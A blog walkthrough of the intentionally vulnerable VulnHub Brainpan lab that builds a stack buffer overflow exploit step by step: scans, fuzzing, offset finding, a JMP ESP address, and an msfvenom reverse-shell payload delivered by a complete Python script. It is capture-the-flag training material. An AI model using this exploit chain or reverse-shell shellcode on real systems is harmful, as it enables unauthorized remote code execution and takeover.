---
layout: post
title:  "VulnHub - Brainpan"
categories: [VulnHub,walkthrough]
pin: true
tags: [fuzzing,badchars,JMP ESP,BOF,Immunity Debugger,Shellcode,pattern_create,pattern_offset]
image: /images/brainpan.jpg
---

## VulnHub - Brainpan 1

- i will update soon the post to add the images

#### Port Scan

```bash
┌──(alienum㉿kali)-[~]
└─$ sudo nmap -A -O -sS 10.0.2.254                                        
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 00:08 EEST
Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.28% done; ETC: 00:09 (0:00:00 remaining)
Nmap scan report for 10.0.2.254 (10.0.2.254)
Host is up (0.00090s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings:
|   NULL:
|     _| _|
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-title: Site doesnt have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.91%I=7%D=6/7%Time=60BD3967%P=x86_64-pc-linux-gnu%r(NUL
SF:L,298,_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|\
SF:x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x
SF:20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x2
SF:0\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
SF:0\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
SF:0\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|\
SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
SF:0_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
SF:0_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x2
...
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.90 ms 10.0.2.254 (10.0.2.254)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.94 seconds
```

#### Directory Scan | Port 10000

![image]( /assets/img/brainpan/Pasted image 20210607001157.png)

- Found : /bin

```bash
┌──(alienum㉿kali)-[~]
└─$ gobuster dir -k -u http://10.0.2.254:10000 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x.txt,.bak,.exe
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.254:10000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,bak,exe
[+] Timeout:                 10s
===============================================================
2021/06/07 00:12:54 Starting gobuster in directory enumeration mode
===============================================================
/bin                  (Status: 301) [Size: 0] [--> /bin/]
Progress: 29444 / 5095336 (0.58%)
```

- download the brainpan.exe
- move it to your windows lab
- open it with the Immunity Debugger

![image]( /assets/img/brainpan/Pasted image 20210607001517.png)

#### BOF

###### My Arsenal

- Eclipse Python Dev
- Immunity Debugger
- Windows 10

#### Fuzzing

- Remember in python3 you need to encode the payload
- fuzzing crashed at 600 bytes
- EIP Successful overrided with As (41)

-   `Extended Stack Pointer (ESP)`

ESP denotes the address where the next data has to be entered into the stack and holds the top of the stack. This is the point where the instructions which use the stack (PUSH, POP, CALL and RET).

-   `Buffer Space`

A stack buffer is a type of buffer or temporary location created within a computer’s memory for storing and retrieving data from the stack. It enables the storage of data elements within the stack, which can later be accessed programmatically by the program’s stack function or any other function calling that stack. Any information placed into the buffer space should never travel outside of the buffer space itself.

-   `Extended Base Pointer (EBP)`

EBP denotes the address of the location where the first data has to be entered into the stack.

-   `Extended Instruction Pointer (EIP) / Return Address`

EIP denotes the address of next instruction has to be executed into the stack.

![image]( /assets/img/brainpan/Pasted image 20210609231540.png)


```python
import sys, socket
import time

buffer = "A" * 100

while True:

 try:
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect(('127.0.0.1',9999))
     s.recv(1024)
     buffer = buffer + "A" * 100
     s.send(buffer.encode('utf-8'))
     s.close()
     time.sleep(1)
     print("Fuzzing passed %s bytes" % str(len(buffer)))

 except Exception as ex:

        print("Fuzzing crashed at %s bytes" % str(len(buffer)))
        print(ex)
        sys.exit()
```

#### Offset

- The fuzzing stopped at 600 byres so we will use 600  bytes for pattern length
- generate a pattern

```bash
┌──(alienum㉿kali)-[~]
└─$ msf-pattern_create -l 600 -s ABCDEFGHIKL,alienum,123456789
Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Al1Al2Al3Al4Al5Al6Al7Al8Al9Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9An1An2An3An4An5An6An7An8An9Au1Au2Au3Au4Au5Au6Au7Au8Au9Am1Am2Am3Am4Am5Am6Am7Am8Am9Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Be1Be2Be3Be4Be5Be6Be7Be8Be9Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Da1Da2Da3Da4Da5Da6Da7Da8Da9Dl1Dl2
```

- offset.py

```python
import socket,sys

#msf-pattern_create -l 600 -s ABCDEFGHIKL,alienum,123456789
payload = "Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Al1Al2Al3Al4Al5Al6Al7Al8Al9Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9An1An2An3An4An5An6An7An8An9Au1Au2Au3Au4Au5Au6Au7Au8Au9Am1Am2Am3Am4Am5Am6Am7Am8Am9Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Be1Be2Be3Be4Be5Be6Be7Be8Be9Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Da1Da2Da3Da4Da5Da6Da7Da8Da9Dl1Dl2"


try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1',9999))
    s.recv(1024)
    s.send(payload.encode('utf-8'))
    s.close()
except Exception as e:
    print("[X] Connection error")
    print(e)
    sys.exit()
```


- EIP Overrided with value :  **35754334**
- This number will be usefull to find the exact offset in order to control the EIP

![image]( /assets/img/brainpan/Pasted image 20210609232300.png)

###### Exact offset

- The exact offset is  524

```bash
┌──(alienum㉿kali)-[~]
└─$ msf-pattern_offset -l 600 -s ABCDEFGHIKL,alienum,123456789 -q 35754334
[*] Exact match at offset 524
```

![image]( /assets/img/brainpan/Pasted image 20210609234130.png)

- Let's confirm the EIP control


#### Control

- EIP Control Success

![image]( /assets/img/brainpan/Pasted image 20210609234824.png)

```python
import socket,sys

#Identify the EIP control
#EIP SHOULD BE 42424242 = BBBB
payload = "A" * 524 + "B" * 4

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1',9999))
    s.recv(1024)
    s.send(payload.encode('utf-8'))
    s.close()
except Exception as ex:
    print("[X] Connection error")
    print(ex)
    sys.exit()
```


#### Badchars after EIP Control

Some characters can cause issues in the development of exploits. I will send at once every hex value of ASCII characters to the brainpan.exe to see if any character cause issues.

- script

```python
import socket,sys

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

buffer= "A" * 524 + "B" * 4 + badchars

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1',9999))
    s.recv(1024)
    s.send(buffer.encode('utf-8'))
    s.close()
except Exception as ex:
    print(ex)
    print("[X] Connection error")
    sys.exit()
```

- We are lucky there aren't badchars
- By default  `\x00` is badchar so we excluded from the list
- Check the [VulnHub - School](https://al1enum.github.io/vulnhub/walkthrough/2020/12/16/vulnhub-school.html) for BOF with badchars and how to handle it

![image]( /assets/img/brainpan/Pasted image 20210609235751.png)

#### JMP ESP

We don’t need to give to the EIP the exact address of our malicious shellcode. The instruction **JMP ESP** will jump to the stack pointer and execute our malicious shellcode. So, If we can find the JMP ESP instruction in the program, we can give its memory address to the EIP and it will jump to automatically to our malicious shellcode.

![image]( /assets/img/brainpan/Pasted image 20210609235930.png)

Immunity Debugger -> Search for -> All commands -> JMP ESP

![image]( /assets/img/brainpan/Pasted image 20210610000525.png)

- The address of the JMP ESP is :  
	- 311712F3 or in little endian
	-  `\xF3\x12\x17\x31`

#### JMP ESP | Call confirmation

- Toggle Breakpoint on JMP ESP Address

![image]( /assets/img/brainpan/Pasted image 20210610001923.png)

- Becarefull do not encode the `\xF3\x12\x17\x31` just  concat it with the encoded payload like this  `payload.encode('utf-8')+b'\xF3\x12\x17\x31'`

```python
import socket,sys

#Identify that the EIP call the 'JMP ESP's instruction address
payload = "A" * 524
try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1',9999))
    s.recv(1024)
    s.send(payload.encode('utf-8')+b'\xF3\x12\x17\x31')
    s.close()
except Exception as ex:
    print(ex)
    print("[X] Connection error")
    sys.exit()
```

![image]( /assets/img/brainpan/Pasted image 20210610005103.png)

- We triggered the breakpoint. Therefore, the EIP call successfully the address of the Instruction JMP ESP.

#### Reverse Shell

- msfvenom
- flag `-b` means generate shellcode without the specificied bad chars

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f python -a x86 -b '\x00'
```

```bash
┌──(alienum㉿kali)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f python -a x86 -b '\x00'
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1712 bytes
buf =  b""
buf += b"\xda\xd3\xba\xad\x21\x4e\x88\xd9\x74\x24\xf4\x5e\x29"
...
buf += b"\xfa\x1e\x02\x15\xbc\xf3\x7e\x06\x29\xf3\x2d\x27\x78"     
┌──(alienum㉿kali)-[~]
└─$
```


- python script
- Important the above code is running with python not python3 like previous scripts

```python
import socket,sys



#msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR IP> LPORT=4444 -f python -a x86 -b '\x00'

buf =  b""
buf += b"\xbb\x4c\x6c\xb3\x79\xd9\xeb\xd9\x74\x24\xf4\x5a\x33"
buf += b"\xc9\xb1\x52\x83\xea\xfc\x31\x5a\x0e\x03\x16\x62\x51"
buf += b"\x8c\x5a\x92\x17\x6f\xa2\x63\x78\xf9\x47\x52\xb8\x9d"
buf += b"\x0c\xc5\x08\xd5\x40\xea\xe3\xbb\x70\x79\x81\x13\x77"
buf += b"\xca\x2c\x42\xb6\xcb\x1d\xb6\xd9\x4f\x5c\xeb\x39\x71"
buf += b"\xaf\xfe\x38\xb6\xd2\xf3\x68\x6f\x98\xa6\x9c\x04\xd4"
buf += b"\x7a\x17\x56\xf8\xfa\xc4\x2f\xfb\x2b\x5b\x3b\xa2\xeb"
buf += b"\x5a\xe8\xde\xa5\x44\xed\xdb\x7c\xff\xc5\x90\x7e\x29"
buf += b"\x14\x58\x2c\x14\x98\xab\x2c\x51\x1f\x54\x5b\xab\x63"
buf += b"\xe9\x5c\x68\x19\x35\xe8\x6a\xb9\xbe\x4a\x56\x3b\x12"
buf += b"\x0c\x1d\x37\xdf\x5a\x79\x54\xde\x8f\xf2\x60\x6b\x2e"
buf += b"\xd4\xe0\x2f\x15\xf0\xa9\xf4\x34\xa1\x17\x5a\x48\xb1"
buf += b"\xf7\x03\xec\xba\x1a\x57\x9d\xe1\x72\x94\xac\x19\x83"
buf += b"\xb2\xa7\x6a\xb1\x1d\x1c\xe4\xf9\xd6\xba\xf3\xfe\xcc"
buf += b"\x7b\x6b\x01\xef\x7b\xa2\xc6\xbb\x2b\xdc\xef\xc3\xa7"
buf += b"\x1c\x0f\x16\x67\x4c\xbf\xc9\xc8\x3c\x7f\xba\xa0\x56"
buf += b"\x70\xe5\xd1\x59\x5a\x8e\x78\xa0\x0d\xbb\x7c\xa8\xc2"
buf += b"\xd3\x7e\xac\xcd\x7f\xf6\x4a\x87\x6f\x5e\xc5\x30\x09"
buf += b"\xfb\x9d\xa1\xd6\xd1\xd8\xe2\x5d\xd6\x1d\xac\x95\x93"
buf += b"\x0d\x59\x56\xee\x6f\xcc\x69\xc4\x07\x92\xf8\x83\xd7"
buf += b"\xdd\xe0\x1b\x80\x8a\xd7\x55\x44\x27\x41\xcc\x7a\xba"
buf += b"\x17\x37\x3e\x61\xe4\xb6\xbf\xe4\x50\x9d\xaf\x30\x58"
buf += b"\x99\x9b\xec\x0f\x77\x75\x4b\xe6\x39\x2f\x05\x55\x90"
buf += b"\xa7\xd0\x95\x23\xb1\xdc\xf3\xd5\x5d\x6c\xaa\xa3\x62"
buf += b"\x41\x3a\x24\x1b\xbf\xda\xcb\xf6\x7b\xea\x81\x5a\x2d"
buf += b"\x63\x4c\x0f\x6f\xee\x6f\xfa\xac\x17\xec\x0e\x4d\xec"
buf += b"\xec\x7b\x48\xa8\xaa\x90\x20\xa1\x5e\x96\x97\xc2\x4a"


payload = "A"*524
payload = payload + "\xF3\x12\x17\x31"
nop = 20*"\x90"
payload = payload + nop + buf

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('10.0.2.254',9999))
    s.recv(1024)
    s.send(payload)
    s.close()
except Exception as ex:  
    print ex
    print "[X] Connection error"
    sys.exit()
```

- the `20*"\x90"` is 20 nops to make sure that we will jump to our shellcode

- reverse shell done

![image]( /assets/img/brainpan/Pasted image 20210610013722.png)
